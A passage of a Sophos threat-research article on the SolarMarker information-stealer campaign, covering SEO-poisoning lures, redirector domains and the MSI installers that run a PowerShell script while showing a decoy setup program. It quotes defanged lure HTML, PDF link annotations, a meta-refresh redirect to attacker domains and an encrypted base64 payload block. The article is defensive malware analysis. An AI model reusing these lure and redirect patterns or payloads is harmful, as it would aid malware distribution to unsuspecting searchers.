1.08.934 1.08 1.714 0 .652-.3 1.122-.83 1.447-.426.278-1.157.403-2.49.403H.358v2.99zM71.99 4.596c-.52.813-.765 2.118-.765 3.87 0 3.845 1.331 5.595 4.294 5.595 2.915 0 4.248-1.75 4.248-5.546 0-3.847-1.308-5.571-4.248-5.571-1.604 0-2.864.592-3.53 1.652zm10.05-1.897c1.013 1.33 1.58 3.498 1.58 6.039 0 2.882-.914 5.249-2.544 6.555-1.233.986-3.11 1.528-5.335 1.528-3.16 0-5.654-1.037-6.937-2.884-.964-1.355-1.435-3.155-1.435-5.35 0-3.152.866-5.544 2.495-6.826C71.149.726 73.175.158 75.497.158c2.938 0 5.284.913 6.543 2.54zM65.36.279h-3.507v6.73h-6.345V.278h-3.507v16.439h3.507V9.94h6.345v6.778h3.506V.278zM43.533 8.042c.938 0 1.48-.123 1.852-.469.442-.37.715-1.158.715-2.07 0-1.084-.443-1.872-1.208-2.144-.272-.1-.717-.149-1.286-.149h-4.839v4.832h4.766zm-4.766 8.674h-3.507V.278h8.223c2.889 0 3.902.295 4.988 1.504.964 1.036 1.481 2.39 1.481 3.845 0 1.725-.69 3.327-1.826 4.289-.962.813-1.854 1.058-3.728 1.058h-5.63v5.743zM21.665 4.596c-.519.813-.764 2.118-.764 3.87 0 3.845 1.333 5.595 4.297 5.595 2.913 0 4.247-1.75 4.247-5.546 0-3.847-1.308-5.571-4.247-5.571-1.606 0-2.866.592-3.533 1.652zm10.052-1.897c1.014 1.33 1.581 3.498 1.581 6.039 0 2.882-.914 5.249-2.545 6.555-1.233.986-3.11 1.528-5.333 1.528-3.162 0-5.656-1.037-6.94-2.884-.964-1.355-1.432-3.155-1.432-5.35 0-3.152.865-5.544 2.496-6.826C20.825.726 22.85.158 25.173.158c2.938 0 5.286.913 6.544 2.54z"/>
					</g>
				</svg>
				</a>
			</div>

			<!-- Search Field -->
			<div class="lg:flex justify-end flex-grow hidden" x-show="searchField" x-cloak>
				<div class="relative w-1/2 rounded-md shadow-sm">
					<form role="search" method="get" action="https://news.sophos.com/en-us/">
						<input
							type="text"
							class="block w-full text-lg text-white placeholder-gray-100 bg-blue-800 border-0 rounded-md font-sansMedium font-medium"
							placeholder="Type to Search News"
							x-ref="searchInput"
							name="s"
						/>
						<div class="absolute inset-y-0 right-0 flex items-center px-3">
							<button
								class="hover:opacity-100 opacity-60 p-1 text-xs text-white uppercase rounded-full cursor-pointer"
								type="submit"
							>
								Search							</button>
						</div>
					</form>
				</div>
			</div>

			<!-- Main Nav -->
			<div class="lg:flex items-center flex-grow hidden" x-show="!searchField" x-cloak>
				<div class="flex ml-auto">
				<ul id="menu-en-us-primary" class="primary-menu"><li id="menu-item-77773" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77773"><a href="https://news.sophos.com/en-us/category/products-services/">Products &amp; Services<div class="menu-item-description"></div></a></li>
<li id="menu-item-77772" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77772"><a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations<div class="menu-item-description"></div></a></li>
<li id="menu-item-77774" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-77774"><a href="https://news.sophos.com/en-us/category/threat-research/">Threat Research<div class="menu-item-description"></div></a></li>
<li id="menu-item-85326" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-85326"><a href="https://news.sophos.com/en-us/category/ai-research/">AI Research<div class="menu-item-description"></div></a></li>
<li id="menu-item-951374" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-951374"><a href="https://news.sophos.com/en-us/category/serious-security/">Naked Security<div class="menu-item-description"></div></a></li>
<li id="menu-item-83702" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-83702"><a href="https://news.sophos.com/en-us/category/sophos-life/">Sophos Life<div class="menu-item-description"></div></a></li>
</ul>				</div>
			</div>

			<!-- Search button -->
			<div class="lg:block hidden ml-4">
				<div class="flex items-center">
					<button
					class="border-2 border-transparent hover:border-white inline-flex items-center justify-center p-2 text-white rounded-md focus:outline-none transition-colors"
					@click.prevent="searchField = !searchField; $nextTick(() => { setTimeout(() => { $refs.searchInput.focus(); }, 150);});"
					>
						<span class="sr-only">Search</span>
						<!-- Heroicon name: outline/bell -->
						<svg
							class="w-5 h-5"
							xmlns="http://www.w3.org/2000/svg"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor"
							:class="{ 'block': !searchField, 'hidden': searchField }"
						>
							<path
							stroke-linecap="round"
							stroke-linejoin="round"
							stroke-width="3"
							d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
							/>
						</svg>
						<svg
							class="hidden w-5 h-5"
							xmlns="http://www.w3.org/2000/svg"
							fill="none"
							viewBox="0 0 24 24"
							stroke="currentColor"
							aria-hidden="true"
							:class="{ 'block': searchField, 'hidden': !searchField }"
						>
							<path
							stroke-linecap="round"
							stroke-linejoin="round"
							stroke-width="3"
							d="M6 18L18 6M6 6l12 12"
							/>
						</svg>
					</button>
				</div>
			</div>

			<!-- Mobile menu button -->
			<div class="lg:hidden flex -mr-2">
				<button
					type="button"
					class="hover:text-white hover:bg-blue-800 focus:outline-none hover:ring-2 focus:ring-offset-2 focus:ring-offset-gray-300 focus:ring-white inline-flex items-center justify-center p-2 text-white rounded-md"
					aria-controls="mobile-menu"
					aria-expanded="false"
					@click="mobileMenu = !mobileMenu"
				>
					<span class="sr-only">Open main menu</span>
					<!--
						Heroicon name: outline/menu

						Menu open: "hidden", Menu closed: "block"
					-->
					<svg
					class="block w-6 h-6"
					xmlns="http://www.w3.org/2000/svg"
					fill="none"
					viewBox="0 0 24 24"
					stroke="currentColor"
					:class="{ 'block': !mobileMenu, 'hidden': mobileMenu }"
					>
					<path
						stroke-linecap="round"
						stroke-linejoin="round"
						stroke-width="3"
						d="M4 6h16M4 12h16m-7 6h7"
					/>
					</svg>
					<!--
						Heroicon name: outline/x

						Menu open: "block", Menu closed: "hidden"
					-->
					<svg
					class="hidden w-6 h-6"
					xmlns="http://www.w3.org/2000/svg"
					fill="none"
					viewBox="0 0 24 24"
					stroke="currentColor"
					aria-hidden="true"
					:class="{ 'block': mobileMenu, 'hidden': !mobileMenu }"
					>
					<path
						stroke-linecap="round"
						stroke-linejoin="round"
						stroke-width="3"
						d="M6 18L18 6M6 6l12 12"
					/>
					</svg>
				</button>
			</div>
		</div>
	</div>

	<!-- Mobile menu, show/hide based on menu state. -->
	<div
	class="lg:hidden container"
	x-show="mobileMenu"
	x-cloak
	x-transition:enter="transition-all ease-out duration-100"
	x-transition:enter-start="transform opacity-0 scale-95"
	x-transition:enter-end="transform opacity-100 scale-100"
	x-transition:leave="transition ease-in duration-75"
	x-transition:leave-start="transform opacity-100 scale-100"
	x-transition:leave-end="transform opacity-0 scale-95"
	>
		<div class="pt-2 pb-8 space-y-2">
			<div class="relative rounded-md shadow-sm">
				<form role="search" method="get" action="https://news.sophos.com/en-us/">
					<input
						type="text"
						class="focus:ring-blue-600 focus:border-blue-600 sm:text-sm block w-full placeholder-gray-600 border-gray-300 rounded-md"
						placeholder="Search News"
						name="s"
					/>
					<div
						class="absolute inset-y-0 right-0 flex items-center px-3 pointer-events-none"
					>
						<button class="p-1 text-gray-500 rounded-full" type="submit">
							<span class="sr-only">Search</span>
							<!-- Heroicon name: outline/bell -->
							<svg
								class="w-4 h-4"
								xmlns="http://www.w3.org/2000/svg"
								fill="none"
								viewBox="0 0 24 24"
								stroke="currentColor"
							>
								<path
									stroke-linecap="round"
									stroke-linejoin="round"
									stroke-width="3"
									d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
								/>
							</svg>
						</button>
					</div>
				</form>
			</div>

			<ul id="menu-en-us-primary-1" class="mobile-menu"><li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77773"><a href="https://news.sophos.com/en-us/category/products-services/">Products &amp; Services<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-77772"><a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-77774"><a href="https://news.sophos.com/en-us/category/threat-research/">Threat Research<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-85326"><a href="https://news.sophos.com/en-us/category/ai-research/">AI Research<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-951374"><a href="https://news.sophos.com/en-us/category/serious-security/">Naked Security<div class="menu-item-description"></div></a></li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-83702"><a href="https://news.sophos.com/en-us/category/sophos-life/">Sophos Life<div class="menu-item-description"></div></a></li>
</ul>		</div>
	</div>
</header>

	<div id="content">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-81186" class="post-81186 post type-post status-publish format-standard has-post-thumbnail hentry category-threat-research tag-featured tag-information-stealers tag-jupiter tag-polazert tag-security-operations tag-seo-poisoning tag-solarmarker region-en-us">

		<div class="md:mt-16 container mt-8">
		<div class="relative max-w-5xl mx-auto">
				<div
						class="aspect-w-16 aspect-h-9 flex bg-gray-400 bg-right bg-no-repeat bg-cover"
				>
					<img width="985" height="544" src="https://news.sophos.com/wp-content/uploads/2022/01/solarflare-e1642178554820.jpeg?w=985" class="object-cover wp-post-image" alt="" decoding="async" fetchpriority="high" srcset="https://news.sophos.com/wp-content/uploads/2022/01/solarflare-e1642178554820.jpeg 985w, https://news.sophos.com/wp-content/uploads/2022/01/solarflare-e1642178554820.jpeg?resize=300,166 300w, https://news.sophos.com/wp-content/uploads/2022/01/solarflare-e1642178554820.jpeg?resize=768,424 768w" sizes="(max-width: 985px) 100vw, 985px" />				</div>
								<div
						class="left-4 w-24 h-24 lg:left-12 xl:left-16 lg:w-40 lg:h-40 place-items-center absolute top-0 grid  "
				>
										<img
							src="https://news.sophos.com/wp-content/uploads/2022/07/Category-Icon-X-Ops-v2.png"
							alt="Threat Research"
					/>
														</div>
						</div>
	</div>


			
	<header>
		<div class="container mt-8 md:mt-16 md:-mb-4">
			<div class="max-w-4xl mx-auto">

				<h1 class="text-style-h1 mb-8">SolarMarker campaign used novel registry changes to establish persistence</h1>
									<div class="text-xl md:text-2xl -mt-2 mb-6">
						Inserting custom file handling rules for a randomly-created file extension and a .LNK in Windows&#039; startup folder, malware installer created a stealthy persistence mechanism for backdoor.					</div>
				
				<div class="text-xl md:text-xl -mt-2">
					<span class="byline">
		Written by 				<span class="author vcard">
				<a href="https://news.sophos.com/en-us/author/gabor-szappanos/" title="Posts by Gabor Szappanos" class="author url fn" rel="author">Gabor Szappanos</a>,				</span>
										<span class="author vcard">
				<a href="https://news.sophos.com/en-us/author/sean-gallagher/" title="Posts by Sean Gallagher" class="author url fn" rel="author">Sean Gallagher</a>				</span>
								</span>
						</div>

				<div class="text-sophos-gray-600 mt-4 text-xs font-sansSemiBold font-semibold leading-tight uppercase">
					<span class="posted-on"><a href="https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/" rel="bookmark">February 01, 2022</a></span>				</div>

				<div class="mt-6 space-y-2 space-x-1">
					<a href="https://news.sophos.com/en-us/category/threat-research/" class="category-tag-pill">Threat Research</a> <a href="https://news.sophos.com/en-us/tag/featured/" class="category-tag-pill">featured</a> <a href="https://news.sophos.com/en-us/tag/information-stealers/" class="category-tag-pill">Information Stealers</a> <a href="https://news.sophos.com/en-us/tag/jupiter/" class="category-tag-pill">Jupiter</a> <a href="https://news.sophos.com/en-us/tag/polazert/" class="category-tag-pill">Polazert</a> <a href="https://news.sophos.com/en-us/tag/security-operations/" class="category-tag-pill">Security Operations</a> <a href="https://news.sophos.com/en-us/tag/seo-poisoning/" class="category-tag-pill">SEO Poisoning</a> <a href="https://news.sophos.com/en-us/tag/solarmarker/" class="category-tag-pill">SolarMarker</a>				</div>
			</div>
		</div>
	</header><!-- .entry-header -->

	<div class="container md:my-16 xl:my-24 my-8">
	<div class="entry-content lg:prose-lg mx-auto prose max-w-4xl">
		<p>Over the past seven months, SophosLabs has monitored a series of new efforts to distribute SolarMarker, an information stealer and backdoor (also known as Jupyter or Polazert). First detected in 2020, the .NET malware usually delivered by a PowerShell installer has information harvesting and backdoor capabilities.</p>
<p>In October, 2021, we observed a set of active SolarMarker campaigns that combined search engine optimization (SEO) targeting with custom-made MSI installer packages to deliver the payload. These installers used an unusual method to ensure the persistence of the SolarMarker backdoor.</p>
<p>The campaigns followed a common pattern: Using malicious SEO techniques, the SolarMarker actors were able to place links to web sites with deceptive content in search results from multiple search engines. While this sort of SEO poisoning has been seen in the past, it has rarely been seen used beyond some recent <a href="https://news.sophos.com/en-us/2021/09/01/fake-pirated-software-sites-serve-up-malware-droppers-as-a-service/">downloader-as-a-service operations</a>.</p>
<p>These SEO efforts, which leveraged a combination of Google Groups discussions and deceptive web pages and PDF documents hosted on compromised (usually WordPress) websites,  were so effective that the SolarMarker lures were usually at or near the top of search results for  phrases the SolarMarker actors targeted.</p>
<p>These lure sites, in turn, attempted to deceive users into downloading a Windows installer. When downloaded, the malicious Microsoft installer (.msi) files would in turn execute a decoy install program, while at the same time launching a PowerShell script that installed the malware.</p>
<p>The PowerShell script modified the Windows registry and dropped a .lnk file into Windows&#8217; startup directory to establish persistence. Using Windows registry changes made by the install script, the loading of the .lnk at Windows startup would load the malware from an encrypted payload hidden amongst a &#8220;smokescreen&#8221; of other, seemingly meaningless files.</p>
<h3>SEO blunderbuss</h3>
<p>The criminals used at least three distribution methods for the malware distribution, sometime simultaneously.  For example, in the following example all three of the distribution methods ended up in the top ten Google hits for the poisoned keywords (marked by method in the screenshot):</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/SolarMarkerSearch.png"><img decoding="async" class="alignnone wp-image-81495 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/SolarMarkerSearch.png" alt="" width="568" height="352" srcset="https://news.sophos.com/wp-content/uploads/2022/01/SolarMarkerSearch.png 568w, https://news.sophos.com/wp-content/uploads/2022/01/SolarMarkerSearch.png?resize=300,186 300w" sizes="(max-width: 568px) 100vw, 568px" /></a></p>
<p>In each of these SEO methods, the name of the MSI installer file matches the search terms. For example, one of the samples we recovered was named <strong>good-choice-bad-choice-worksheet-for-kids.msi</strong>. Based on the names of samples we&#8217;ve seen in the wild, the following search keywords appeared to be the most successful from the attacker’s point of view:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/SolarMarkerWOrdCloud.png"><img decoding="async" class="alignnone wp-image-81496 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/SolarMarkerWOrdCloud.png" alt="" width="935" height="556" srcset="https://news.sophos.com/wp-content/uploads/2022/01/SolarMarkerWOrdCloud.png 935w, https://news.sophos.com/wp-content/uploads/2022/01/SolarMarkerWOrdCloud.png?resize=300,178 300w, https://news.sophos.com/wp-content/uploads/2022/01/SolarMarkerWOrdCloud.png?resize=768,457 768w" sizes="(max-width: 935px) 100vw, 935px" /></a></p>
<h3></h3>
<h3>SEO Method 1: Google Groups</h3>
<p>In the first method we observed, the SEO was accomplished through the creation of Google Groups discussions. The attackers created multiple fake Google groups, each with 500-600 fake conversation entries, targeting the most common search terms in a wide variety of subjects:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/googlegroupsSolarmarker.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81497 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/googlegroupsSolarmarker.png" alt="" width="604" height="306" srcset="https://news.sophos.com/wp-content/uploads/2022/01/googlegroupsSolarmarker.png 604w, https://news.sophos.com/wp-content/uploads/2022/01/googlegroupsSolarmarker.png?resize=300,152 300w" sizes="auto, (max-width: 604px) 100vw, 604px" /></a></p>
<p>&nbsp;</p>
<p>The comments themselves have no content other than what appears to be links to PDF files, as in the following example:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/groups_solarmarker.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81498 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/groups_solarmarker.png" alt="" width="604" height="282" srcset="https://news.sophos.com/wp-content/uploads/2022/01/groups_solarmarker.png 604w, https://news.sophos.com/wp-content/uploads/2022/01/groups_solarmarker.png?resize=300,140 300w" sizes="auto, (max-width: 604px) 100vw, 604px" /></a></p>
<p>However, the disguised link leads to a redirection site (<strong>hxxps://abocomteamsd[.]site/Variable-Length-File-Declaration-In-Cobol</strong>&#8220;), which is only the next element in the download chain:</p>
<pre>&lt;a href="hxxps://abocomteamsd[.]site/Variable-Length-File-Declaration-In-Cobol"target="_blank" rel="nofollow" data-saferedirecturl="hxxps://www.google.com/url?hl=hu&amp;amp;q=hxxps://abocomteamsd[.]site/Variable-Length-File-Declaration-In-Cobol&amp;amp;source=gmail&amp;amp;ust=1636557011760000&amp;amp; usg=AFQjCNGBOEcF9QaTJVv6GoQFs_cbKH1yYw"&gt;&lt;img alt="OEyQtsI7nXS.jpg" width="550px" height="162px" src="hxxps://groups[.]google.com/group/8pxafs/attach/3612f6b957d5d/OEyQtsI7nXS.jpg?part=0.1&amp;amp;view=1" data-iml="3609"&gt;&lt;/a&gt;</pre>
<p>It&#8217;s likely that this distribution method was from an older campaign. While the links still resolved as we prepared our analysis, they returned a zero-length response—indicating no content remained at the destination. However, we were able to collect the keywords from the group posts to analyze the search terms the criminals behind the campaign were attempting to poison. The word cloud below displays the frequency of keywords in those search terms:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/12/search-terms-solarmarker.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-81209" src="https://news.sophos.com/wp-content/uploads/2021/12/search-terms-solarmarker.png" alt="" width="640" height="415" srcset="https://news.sophos.com/wp-content/uploads/2021/12/search-terms-solarmarker.png 798w, https://news.sophos.com/wp-content/uploads/2021/12/search-terms-solarmarker.png?resize=300,195 300w, https://news.sophos.com/wp-content/uploads/2021/12/search-terms-solarmarker.png?resize=768,499 768w" sizes="auto, (max-width: 640px) 100vw, 640px" /></a></p>
<p>This aligns with the statistics gathered from the MSI installers, showing the efficiency of the method. It also shows that the criminals were not particularly picky about their chosen search terms—they cast a wide net, aiming for many target interests and potential target types.</p>
<h3>SEO Method 2: PDF implants</h3>
<p>In another set of lures, the initial deceptive content used for SEO is stored in PDF files hosted on websites; the search engines linked to the PDF files themselves directly as a result of the malicious SEO efforts.</p>
<p>In most of the cases, compromised WordPress sites were used to host PDF files, specifically in the <strong>wp-content/uploads/formidable</strong> directories on those websites.In other cases, the same PDF content was stored in an Amazon cloud site, or a CDN site.</p>
<p>When the link in the search engine is clicked, the web browser opens the malicious PDFs as it would any other PDF document on the web . The actual content of these malicious PDFs is limited to the text of the targeted search term and two download buttons —one for the PDF component, the other for DOC:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/pdf_solarmarker.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81499 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/pdf_solarmarker.png" alt="" width="604" height="350" srcset="https://news.sophos.com/wp-content/uploads/2022/01/pdf_solarmarker.png 604w, https://news.sophos.com/wp-content/uploads/2022/01/pdf_solarmarker.png?resize=300,174 300w" sizes="auto, (max-width: 604px) 100vw, 604px" /></a></p>
<p>The corresponding code in the PDF file source links these buttons to a distribution site, hxxps://sseiatca[.]site:</p>
<pre>/Annots [&lt;&lt;/Type /Annot /Subtype /Link /Rect [22.00 472.00 288.00 393.00] /Border [0 0 0] /A &lt;&lt;/S /URI /URI (hxxps://sseiatca[.]site/Variable-Length-File-Declaration-In-Cobol/pdf/sitedomen/7|29279|5|1|1|1)&gt;&gt;&gt;&gt;&lt;&lt;/Type /Annot /Subtype /Link /Rect [302.00 457.00 548.00 384.00] /Border [0 0 0] /A &lt;&lt;/S /URI /URI (hxxps://sseiatca[.]site/Variable-Length-File-Declaration-In-Cobol/doc/sitedomen/7|29279|5|1|1|1)&gt;&gt;&gt;&gt;]</pre>
<p>&nbsp;</p>
<h3>SEO Method 3: deceptive web pages</h3>
<p>This method also uses compromised WordPress sites to deliver the content, but instead uses HTML pages hosted on the compromised site. The HTML source for these malicious pages contain link collections for other search terms, all connected to other malicious pages on the same compromised server, as part of the mechanism behind the fraudulent SEO campaign:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/seo-mal-content.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81402 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/seo-mal-content.png" alt="" width="2206" height="696" srcset="https://news.sophos.com/wp-content/uploads/2022/01/seo-mal-content.png 2206w, https://news.sophos.com/wp-content/uploads/2022/01/seo-mal-content.png?resize=300,95 300w, https://news.sophos.com/wp-content/uploads/2022/01/seo-mal-content.png?resize=768,242 768w, https://news.sophos.com/wp-content/uploads/2022/01/seo-mal-content.png?resize=1024,323 1024w, https://news.sophos.com/wp-content/uploads/2022/01/seo-mal-content.png?resize=1536,485 1536w, https://news.sophos.com/wp-content/uploads/2022/01/seo-mal-content.png?resize=2048,646 2048w" sizes="auto, (max-width: 2206px) 100vw, 2206px" /></a></p>
<p>Also, the pages have a visible string <strong>PdfDocDownloadsPanel </strong>at the beginning of the page, which is a common characteristic of this campaign (previously observed in earlier SolarMarker campaigns):</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/deceptivesite_solarmarker.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81500 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/deceptivesite_solarmarker.png" alt="" width="604" height="776" srcset="https://news.sophos.com/wp-content/uploads/2022/01/deceptivesite_solarmarker.png 604w, https://news.sophos.com/wp-content/uploads/2022/01/deceptivesite_solarmarker.png?resize=234,300 234w" sizes="auto, (max-width: 604px) 100vw, 604px" /></a></p>
<p>The marker string is also clearly visible in the HTML code:</p>
<pre>&lt;span class="logo-text"&gt;PdfDocDownloadsPanel&lt;/span&gt;</pre>
<p>Both of the download buttons on this page advertise different file formats for a download, instead direct to two separate redirectors on  <strong>hxxps://passesleeson[.]site</strong>, using /doc and /pdf in the URL to further bait the click.</p>
<pre>&lt;h1 class="content__caption"&gt;Variable Length File Declaration In Cobol&lt;/h1&gt;
&lt;p class="content__caption" style=" font-size: 16px;"&gt;Filesize: 831 Kb&lt;/p&gt;
&lt;p class="content__caption" style=" font-size: 16px;"&gt;Uploaded: July 18 2020&lt;/p&gt;
&lt;br&gt;&lt;p class="content__caption" style=" font-size: 16px;"&gt;Select download format:&lt;/p&gt;
&lt;br&gt;&lt;a href="hxxps://passesleeson[.]site/pdf/Variable-Length-File-Declaration-In-Cobol" class="button7"&gt;Download PDF&lt;/a&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;a href="hxxps://passesleeson[.]site/doc/Variable-Length-File-Declaration-In-Cobol" class="button7"&gt;Download DOC&lt;/a&gt;</pre>
<p>&nbsp;</p>
<h3>Redirectors</h3>
<p>In each of the three SEO baiting methods discussed above, the download links all connect to sites with the<strong> .site</strong> top-level domain (TLD). In the recent campaigns we have seen about 100 <em>.site </em>domains used. Typically the URLs referring to this site look like this:</p>
<pre>hxxps://triplegnuise[.]site/Clinical-Correlation-Recommended-After-Stress-Test/pdf/sitedomen/3</pre>
<p>The numeric parameter at the end original URL (/3 in this example) is irrelevant. Any number can be put in its place, and the returned content will be similar: a dynamically-created HTML redirect code using a domain selected at random from a large pool of second-stage redirector sites (in the case below, chargraman[.]ml). Each time the link is requested, a different next-stage domain is provided.</p>
<pre>&lt;meta http-equiv="refresh" content="0;URL=hxxps://chargraman[.]ml/22b0270b0a7e4dd147bc74ec3b799366/Clinical-Correlation-Recommended-After-Stress-Test/650845767/pdf"&gt;</pre>
<p>While the example above uses the .ml TLD, the majority of the second-stage redirects in these campaigns used the<strong> .tk</strong> TLD. In the recent campaigns we have seen about 3000 domains used, of which more than 2000 were .tk domains (with the remainder relatively evenly spread across the .ga, .ml, .cf and .gq TLDs).</p>
<p>The second-stage redirect URLS contain the search term used as bait, and return an HTTP response code 302 to redirect to the final destination server.</p>
<p>The downloads all point to <strong>pdfdocdownloadspanel[.]site</strong>, which hosted phishing content since at least 2019. The site has been shut down, so we were unable to retrieve a live version of the target page, but from telemetry from known cases we know that the next part of the infection chain is the download of an MSI installer carrying a decoy PDF viewer.  So there should be a misleading link in between offering the installer based on telemetry associated with the malware.</p>
<h3>The installer</h3>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/Flow-path-solarmarker.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81501 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/Flow-path-solarmarker.png" alt="" width="905" height="595" srcset="https://news.sophos.com/wp-content/uploads/2022/01/Flow-path-solarmarker.png 905w, https://news.sophos.com/wp-content/uploads/2022/01/Flow-path-solarmarker.png?resize=300,197 300w, https://news.sophos.com/wp-content/uploads/2022/01/Flow-path-solarmarker.png?resize=768,505 768w" sizes="auto, (max-width: 905px) 100vw, 905px" /></a></p>
<h3></h3>
<p>The installer file dropped by the download link is named to match the search string that delivered it. In the example above, for instance, the file is  named <strong>good-choice-bad-choice-worksheet-for-kids.msi</strong>. When the installer is opened, it executes a decoy setup application (in this case, <strong>pdfelement-pro_setup_full5239.exe</strong>), while also executing a PowerShell script (<strong>p.ps1</strong> or<strong> InstallScript.ps1</strong>).</p>
<p>The installers require a 64-bit windows. They were generated by the EMCO MSI package builder and contain a pre-installation script. This script prepares and executes the PowerShell installer, while executing the decoy installer.</p>
<p>The typical malware distribution packages look like this:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/msi-solarmarker-package-1.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81502 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/msi-solarmarker-package-1.png" alt="" width="604" height="372" srcset="https://news.sophos.com/wp-content/uploads/2022/01/msi-solarmarker-package-1.png 604w, https://news.sophos.com/wp-content/uploads/2022/01/msi-solarmarker-package-1.png?resize=300,185 300w" sizes="auto, (max-width: 604px) 100vw, 604px" /></a></p>
<p>It contains two files, the decoy executable (dist-x86.exe in this case) and the installer PowerShell script (InstallScript.ps1 in this case). Additionally, two installation actions are defined: the first executes powershell.exe with the script to execute the extracted main install script, while the second launches the decoy executable (dist-x86.exe in this case).</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2022/01/actions-polazert-msi-2.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81503 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/actions-polazert-msi-2.png" alt="" width="1098" height="285" srcset="https://news.sophos.com/wp-content/uploads/2022/01/actions-polazert-msi-2.png 1098w, https://news.sophos.com/wp-content/uploads/2022/01/actions-polazert-msi-2.png?resize=300,78 300w, https://news.sophos.com/wp-content/uploads/2022/01/actions-polazert-msi-2.png?resize=768,199 768w, https://news.sophos.com/wp-content/uploads/2022/01/actions-polazert-msi-2.png?resize=1024,266 1024w" sizes="auto, (max-width: 1098px) 100vw, 1098px" /></a></p>
<p>The most recent scripts we found added a twist to this. In these samples, the PowerShell installer file in the archive is encoded as a base64 string, which is also additionally encrypted:</p>
<pre>aiQOei85cQpkRGJeQQZSIFV+K1x/cHMGaxVtRSVgb187BwoyEQwwDi4mPycmIytdKh03CRozJQUCAC4OMxgdPTw0M
xYCHS0rHhwMNwwNNRgSABgzERQuJSQlJBk1NzgXKiBMGRYWIyIDECENAA0IOGQhBSYUD1wNVSV8OXsNLyY5EwM
UCw5iLDQGJRkLJj8XMxgaPTIzKFkQFgY/ARQ+GwQzKSkHRB4HMDYBdTEPGz4GMDkWDyM6RQYXEEAjPwwxFFEwJS
00HSkTLzheBRUJSQUAMnAvbHFfHyUjAyYlXDYyexsNAQQMIQxHKTMQAmMBJCIYFws2ICQ1GDsHPTABFh4/ASwDEFI
vHDIQIBwiNBsiJR0GNQ0HIC0NDDMIGRcAHwEDABI/JS8SCyw+MTcrJSoLHl8gFiwjG3U5EQAQKhwFHw0IOFAjFCA4cD
gaeToSDDIPMRQSNQIVFi4fFDY4EDoYNyoRMjsaEjoBIhwAG3EeDAwlH0MtDyAOJDIwISU7Fg8mMD4vaCcVOSIuJBQ6D
xwmGjwtQCckFCMdOCYHHg0ddjkzKWgUNzVHFScnJz83P3kiGwJ4fywXIw84EQIYGSc5JgYkJxplMyZAPBIvOw8eBiw
CA3VaFgMQJgUcRi8mJlIwdAMdORkZJAQMPiEDRx9kCD4+BSINCTYOBC4ZAR4RMhUdCS</pre>
<p>In these samples the installation script is slightly more complicated, it also performs a decryption of the PowerShell installer first:<a href="https://news.sophos.com/wp-content/uploads/2022/01/actions-polazert-msi-1.png"><br />
</a> <a href="https://news.sophos.com/wp-content/uploads/2022/01/new-polazert-preinstall-actions-1.png"><img loading="lazy" decoding="async" class="alignnone wp-image-81504 size-full" src="https://news.sophos.com/wp-content/uploads/2022/01/new-polazert-preinstall-actions-1.png" alt="" width="1097" height="259" srcset="https://news.sophos.com/wp-content/uploads/2022/01/new-polazert-preinstall-actions-1.png 1097w, https://news.sophos.com/wp-content/uploads/2022/01/new-polazert-preinstall-actions-1.png?resize=300,71 300w, https://news.sophos.com/wp-content/uploads/2022/01/new-polazert-preinstall-actions-1.png?resize=768,181 768w, https://news.sophos.com/wp-content/uploads/2022/01/new-polazert-preinstall-actions-1.png?resize=1024,242 1024w" sizes="auto, (max-width: 1097px) 100vw, 1097px" /></a></p>
